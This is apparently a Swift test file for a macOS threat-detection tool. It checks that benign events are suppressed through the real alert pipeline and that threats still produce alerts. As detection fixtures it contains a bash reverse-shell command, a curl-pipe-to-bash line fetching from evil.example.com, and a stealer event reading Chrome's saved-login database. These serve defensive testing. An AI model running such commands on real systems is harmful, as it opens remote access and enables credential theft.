// EndToEndFPRateSLOTests.swift
// v1.19 (S1-T9) — the END-TO-END false-positive-rate SLO gate.
//
// WHY THIS EXISTS (the audit gap):
// The sibling FPRateSLOTests.swift drives the benign corpus through
// RuleEngine.evaluate → NoiseFilter.apply and counts the *post-NoiseFilter*
// survivor array DIRECTLY. That catches a regression INSIDE NoiseFilter, but
// it CANNOT catch a STRUCTURAL BYPASS that lives UPSTREAM of (or around) the
// gate — e.g. an all-critical fast path that returns before NoiseFilter ever
// runs, a wiring change that builds alerts from the pre-filter match set, or a
// future "fast lane" that writes straight to AlertStore skipping the sink.
//
// This harness closes that gap by driving the corpus through the REAL emission
// path end-to-end and counting what the actual CHOKEPOINT persists:
//
//     RuleEngine.evaluate(event)                       // real rule engine
//       → NoiseFilter.apply(&matches, event:, …)       // real gates
//       → RuleMatch → Alert  (mirrors EventLoop ~1849) // real alert build
//       → AlertSink.insertEngineBatch(alerts:, event:) // THE CHOKEPOINT
//       → AlertStore (real, temp-dir SQLite)           // what gets counted
//
// The emitted-alert count is read from the SINK (store.count() + sink.stats()),
// NOT from an in-test array — so the assertion is on alerts that actually
// reached persistence. If a structural bypass re-opens (the exact class S1-T1
// fixed: a trusted-signer CRITICAL-rated noise match defeating Gates 7/8), the
// suppressed corpus starts emitting and this test fails at the integration
// level, where the direct-NoiseFilter test is blind.
//
// Two assertions per the SLO contract:
//   1. BENIGN corpus (trusted-signer + Apple-platform + dev-tool noise, incl.
//      CRITICAL-rated suppressible matches on trusted subjects) → emits ≤ budget.
//   2. MUST-FIRE / carve-out threat set (untrusted critical, curl|bash LOLBin on
//      an Apple shell, credential theft by a notarized binary) → STILL EMITS,
//      proving suppression didn't over-reach end-to-end.

import Testing
import Foundation
@testable import MacCrabCore

@Suite("End-to-end FP-rate SLO: benign corpus stays under budget through the real AlertSink chokepoint (v1.19, S1-T9)")
struct EndToEndFPRateSLOTests {

    // MARK: - SLO budget

    /// Max benign alerts allowed to reach the AlertSink across the WHOLE benign
    /// corpus run. The corpus is built to suppress fully (trusted subjects +
    /// suppressible rules), so the real target is 0; this small budget is
    /// regression headroom only. It ties to the audit's operator-facing SLO of
    /// **< 30 alerts/day** on a quiet dev workstation: the corpus is a dense
    /// burst of the ~76% dev/agent share the audit measured, so even at a budget
    /// of `endToEndBenignAlertBudget` per replay the projected daily rate stays
    /// well under that target. Ratchet DOWN as the corpus grows — never up.
    static let endToEndBenignAlertBudget = 3

    // MARK: - Real emission path

    /// Build a real AlertSink backed by a real AlertStore + AlertDeduplicator in
    /// a throwaway temp dir — the same wiring DaemonState builds in production
    /// (AlertStore + AlertDeduplicator → AlertSink). Mirrors AlertSinkTests.
    private func makeRealSink() throws -> (sink: AlertSink, store: AlertStore, dir: URL) {
        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("maccrab-e2e-fp-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let store = try AlertStore(directory: dir.path)
        // Large dedup window so dedup never masks a structural-bypass survivor:
        // we want this test to FAIL loudly if suppression breaks, not to have a
        // 1h dedup window quietly swallow the second of two leaked duplicates.
        let dedup = AlertDeduplicator(suppressionWindow: 3600)
        let sink = AlertSink(alertStore: store, deduplicator: dedup)
        return (sink, store, dir)
    }

    /// A SUPPRESSIBLE CRITICAL rule match representing a SequenceEngine /
    /// BaselineEngine / behavior-heuristic critical (those default
    /// `suppressible == true`, unlike the 18 single-event criticals which are all
    /// `suppressible: false`). The real loop APPENDS these to `matches` BEFORE
    /// calling NoiseFilter.apply (EventLoop.swift ~1597 `matches.append(contentsOf:
    /// sequenceMatches)` → ~1820 `NoiseFilter.apply`), so a sequence/baseline
    /// critical that mis-fires on a TRUSTED subject is the exact structural-bypass
    /// vector S1-T1 closed: pre-fix, the all-must-fire fast path (which keyed on
    /// `severity == .critical`) returned before Gates 7/8 ran, so this leaked to
    /// the sink no matter how trusted the subject. Injecting it here exercises the
    /// closed bypass through the REAL chokepoint — something a direct
    /// NoiseFilter call on the engine's own match array cannot do.
    static func syntheticSuppressibleCritical() -> RuleMatch {
        RuleMatch(
            ruleId: "maccrab.test.synthetic_suppressible_critical",
            ruleName: "Synthetic suppressible critical (sequence/baseline mis-fire)",
            severity: .critical,
            description: "stand-in for a SequenceEngine/BaselineEngine critical that mis-rated a benign trusted-subject event",
            mitreTechniques: ["attack.t1486"],  // impact — NOT an execution/credential carve-out technique
            tags: ["attack.impact", "attack.t1486"],
            suppressible: true)
    }

    /// Drive ONE event through the production emission path and persist any
    /// surviving alerts via the AlertSink chokepoint — a faithful copy of the
    /// EventLoop rule-engine batch path (evaluate → append sequence/baseline
    /// matches → NoiseFilter.apply → build Alert per surviving match →
    /// insertEngineBatch). `extraMatches` models the sequence/baseline/behavior
    /// matches the real loop appends before NoiseFilter runs. Returns the
    /// surviving matches so callers can inspect rule names on failure.
    @discardableResult
    private func emit(
        _ event: Event, engine: RuleEngine, sink: AlertSink,
        extraMatches: [RuleMatch] = []
    ) async throws -> [RuleMatch] {
        var matches = await engine.evaluate(event)
        matches.append(contentsOf: extraMatches)
        // The exact call the real loop makes (EventLoop.swift ~1820). isWarmingUp
        // false → the steady-state path, where Gate-2 is inactive and the trust
        // gates (7/8) do the work.
        NoiseFilter.apply(&matches, event: event, isWarmingUp: false)
        guard !matches.isEmpty else { return [] }

        // RuleMatch → Alert, mirroring EventLoop.swift ~1849-1862 (the fields the
        // engine batch path sets). insertEngineBatch is the SAME chokepoint the
        // loop uses; it does NOT re-run NoiseFilter, so what we count here is
        // exactly what NoiseFilter + the wiring let through.
        let alerts = matches.map { m in
            Alert(
                ruleId: m.ruleId,
                ruleTitle: m.ruleName,
                severity: m.severity,
                eventId: event.id.uuidString,
                processPath: event.process.executable,
                processName: event.process.name,
                description: m.description,
                mitreTactics: m.tags.filter { $0.hasPrefix("attack.") && !$0.contains("t1") }.joined(separator: ","),
                mitreTechniques: m.tags.filter { $0.contains("t1") }.joined(separator: ","),
                suppressed: false
            )
        }
        try await sink.insertEngineBatch(alerts: alerts, event: event)
        return matches
    }

    // MARK: - Event builders

    private func signerType(_ s: String?) -> SignerType? {
        switch s {
        case "apple": return .apple
        case "devId": return .devId
        case "unsigned": return .unsigned
        default: return nil
        }
    }

    private func signature(signer: String?, notarized: Bool, adhoc: Bool? = nil) -> CodeSignatureInfo? {
        signerType(signer).map {
            CodeSignatureInfo(signerType: $0, teamId: nil, signingId: nil, authorities: [],
                              flags: 0, isNotarized: notarized, issuerChain: nil,
                              certHashes: nil, isAdhocSigned: adhoc, entitlements: nil)
        }
    }

    /// Process-creation event from a corpus row (the benign dev/agent noise set).
    private func processEvent(_ f: FPCorpusEvent) -> Event {
        let p = MacCrabCore.ProcessInfo(
            pid: 4321, ppid: 1, rpid: 1, name: (f.executable as NSString).lastPathComponent,
            executable: f.executable, commandLine: f.commandLine, args: [f.executable],
            workingDirectory: "/tmp", userId: 501, userName: "t", groupId: 20, startTime: Date(),
            codeSignature: signature(signer: f.signer, notarized: f.notarized ?? false),
            ancestors: [ProcessAncestor(pid: 1, executable: f.parentExec ?? "/bin/zsh", name: "parent")],
            architecture: "arm64", isPlatformBinary: f.platform ?? false)
        return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: p)
    }

    /// A bare process-creation event with explicit signer/platform knobs.
    private func proc(
        name: String, executable: String, commandLine: String,
        signer: String?, notarized: Bool = false, adhoc: Bool? = nil,
        platform: Bool = false, parentExec: String = "/bin/zsh"
    ) -> Event {
        let p = MacCrabCore.ProcessInfo(
            pid: 4321, ppid: 1, rpid: 1, name: name,
            executable: executable, commandLine: commandLine,
            args: commandLine.split(separator: " ").map(String.init),
            workingDirectory: "/tmp", userId: 501, userName: "t", groupId: 20, startTime: Date(),
            codeSignature: signature(signer: signer, notarized: notarized, adhoc: adhoc),
            ancestors: [ProcessAncestor(pid: 1, executable: parentExec, name: (parentExec as NSString).lastPathComponent)],
            architecture: "arm64", isPlatformBinary: platform)
        return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: p)
    }

    // MARK: - 1. Benign corpus stays under budget end-to-end

    @Test("the benign dev/agent corpus emits no more than the budget through the real AlertSink, and zero CRITICALs reach the sink")
    func benignCorpusUnderBudgetEndToEnd() async throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().appendingPathComponent("fixtures/fp_corpus.json")
        let corpus = try JSONDecoder().decode([FPCorpusEvent].self, from: Data(contentsOf: url))
        #expect(corpus.count >= 10, "FP corpus should be seeded (got \(corpus.count))")

        ensureRulesCompiled()
        let engine = RuleEngine()
        _ = try await engine.loadRules(from: URL(fileURLWithPath: "/tmp/maccrab_v3"))

        let (sink, store, dir) = try makeRealSink()
        defer { try? FileManager.default.removeItem(at: dir) }

        // Replay the whole corpus through the production path. For EVERY benign
        // row we ALSO inject a SUPPRESSIBLE CRITICAL match (the synthetic
        // sequence/baseline mis-fire) the way the real loop appends sequence
        // matches before NoiseFilter — so each trusted-subject event carries the
        // EXACT structural-bypass case S1-T1 fixed: a critical-rated suppressible
        // match on a trusted subject. Every corpus row is a trusted subject
        // (Apple-platform or notarized DevID), so on the v1.19 trust-aware floor
        // ALL of these criticals must be SUPPRESSED before reaching the sink.
        // Pre-S1-T1, each would have leaked, blowing the budget AND tripping the
        // zero-criticals assertion — proving this test catches the bypass at the
        // integration level, which the direct-NoiseFilter sibling cannot.
        let injected = Self.syntheticSuppressibleCritical()
        var survivorDetail: [String] = []
        var criticalSurvivors: [String] = []
        for f in corpus {
            let ev = processEvent(f)
            let survivors = try await emit(ev, engine: engine, sink: sink, extraMatches: [injected])
            for m in survivors {
                survivorDetail.append("[\(m.severity)] \(m.ruleName) on '\(f.name)'")
                if m.severity == .critical { criticalSurvivors.append("\(m.ruleName) on '\(f.name)'") }
            }
        }

        // The chokepoint's own ledger — what ACTUALLY reached persistence.
        let persisted = try await store.count()
        let stats = await sink.stats()

        #expect(criticalSurvivors.isEmpty,
                "a benign event on a TRUSTED subject must never emit an unsuppressed CRITICAL through the real path (the old structural bypass S1-T1 closed): \(criticalSurvivors)")
        #expect(persisted <= Self.endToEndBenignAlertBudget,
                "benign corpus emitted \(persisted) alerts to the AlertSink (budget \(Self.endToEndBenignAlertBudget)): \(survivorDetail.joined(separator: "; "))")
        // store.count() and the sink's own inserted counter must agree — if they
        // diverge, an alert reached AlertStore by a path OTHER than the sink (a
        // structural bypass of the chokepoint itself).
        #expect(persisted == stats.inserted,
                "AlertStore count (\(persisted)) != AlertSink.inserted (\(stats.inserted)) — an alert reached the store outside the chokepoint")
    }

    // MARK: - 2. The must-fire / carve-out threat set still emits end-to-end

    @Test("an untrusted suppressible:false CRITICAL still emits through the real path")
    func untrustedCriticalStillEmits() async throws {
        ensureRulesCompiled()
        let engine = RuleEngine()
        _ = try await engine.loadRules(from: URL(fileURLWithPath: "/tmp/maccrab_v3"))
        let (sink, store, dir) = try makeRealSink()
        defer { try? FileManager.default.removeItem(at: dir) }

        // Reverse-shell pattern (Rules/command_and_control/reverse_shell_pattern.yml):
        // suppressible:false, level critical, on an UNTRUSTED unsigned binary in a
        // user-writable path. Must survive every gate AND reach the sink.
        let ev = proc(
            name: "payload",
            executable: "/tmp/payload",
            commandLine: "bash -c \"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"",
            signer: "unsigned", platform: false, parentExec: "/tmp/dropper")
        let survivors = try await emit(ev, engine: engine, sink: sink)

        #expect(survivors.contains { $0.ruleName.lowercased().contains("reverse shell") },
                "reverse-shell critical must survive NoiseFilter end-to-end; survivors: \(survivors.map { $0.ruleName })")
        let persisted = try await store.count()
        #expect(persisted >= 1, "the reverse-shell critical must reach the AlertSink (persisted \(persisted))")
    }

    @Test("a curl|bash LOLBin on an Apple shell still emits (Gate-7 execution carve-out)")
    func curlBashLolbinStillEmits() async throws {
        ensureRulesCompiled()
        let engine = RuleEngine()
        _ = try await engine.loadRules(from: URL(fileURLWithPath: "/tmp/maccrab_v3"))
        let (sink, store, dir) = try makeRealSink()
        defer { try? FileManager.default.removeItem(at: dir) }

        // curl|bash (Rules/execution/curl_wget_download_execute.yml): the SUBJECT
        // is /bin/bash — an Apple PLATFORM binary. Gate 7 would normally drop a
        // suppressible match on an Apple subject, but the execution/C2 carve-out
        // (isExecutionMatch) keeps it because the maliciousness is in the SUBJECT's
        // OWN commandline. Off-list domain so filter_known_installers doesn't apply.
        let ev = proc(
            name: "bash",
            executable: "/bin/bash",
            commandLine: "bash -c \"curl -s http://evil.example.com/stage2.sh | bash\"",
            signer: "apple", platform: true, parentExec: "/bin/zsh")
        let survivors = try await emit(ev, engine: engine, sink: sink)

        #expect(survivors.contains { $0.ruleName.lowercased().contains("pipe") || $0.ruleName.lowercased().contains("shell") },
                "curl|bash LOLBin on an Apple shell must survive Gate 7 end-to-end; survivors: \(survivors.map { $0.ruleName })")
        let persisted = try await store.count()
        #expect(persisted >= 1, "the curl|bash LOLBin alert must reach the AlertSink (persisted \(persisted))")
    }

    @Test("credential theft by a NOTARIZED Developer-ID binary still emits (Gate-8 carve-out)")
    func notarizedCredentialTheftStillEmits() async throws {
        ensureRulesCompiled()
        let engine = RuleEngine()
        _ = try await engine.loadRules(from: URL(fileURLWithPath: "/tmp/maccrab_v3"))
        let (sink, store, dir) = try makeRealSink()
        defer { try? FileManager.default.removeItem(at: dir) }

        // AMOS/Banshee signed-stealer pattern: a NOTARIZED Developer-ID binary
        // (which Gate 8 would otherwise trust) reading Chrome's Login Data store
        // (Rules/credential_access/chrome_login_data_copied.yml, t1555.003). The
        // Gate-8 credential-theft carve-out (isCredentialTheftMatch) must keep it.
        let chromeLoginData = "\(NSHomeDirectory())/Library/Application Support/Google/Chrome/Default/Login Data"
        let p = MacCrabCore.ProcessInfo(
            pid: 4321, ppid: 1, rpid: 1, name: "Stealer",
            executable: "/Applications/Stealer.app/Contents/MacOS/Stealer",
            commandLine: "/Applications/Stealer.app/Contents/MacOS/Stealer",
            args: ["Stealer"], workingDirectory: "/tmp", userId: 501, userName: "t",
            groupId: 20, startTime: Date(),
            codeSignature: signature(signer: "devId", notarized: true, adhoc: false),
            ancestors: [ProcessAncestor(pid: 1, executable: "/bin/zsh", name: "zsh")],
            architecture: "arm64", isPlatformBinary: false)
        let ev = Event(
            eventCategory: .file, eventType: .change, eventAction: "open",
            process: p,
            file: FileInfo(path: chromeLoginData, action: .open))
        let survivors = try await emit(ev, engine: engine, sink: sink)

        #expect(survivors.contains { NoiseFilter.isCredentialTheftMatch($0) },
                "credential theft by a notarized binary must survive Gate 8 end-to-end; survivors: \(survivors.map { "\($0.ruleName) \($0.mitreTechniques)" })")
        let persisted = try await store.count()
        #expect(persisted >= 1, "the credential-theft alert must reach the AlertSink (persisted \(persisted))")
    }
}
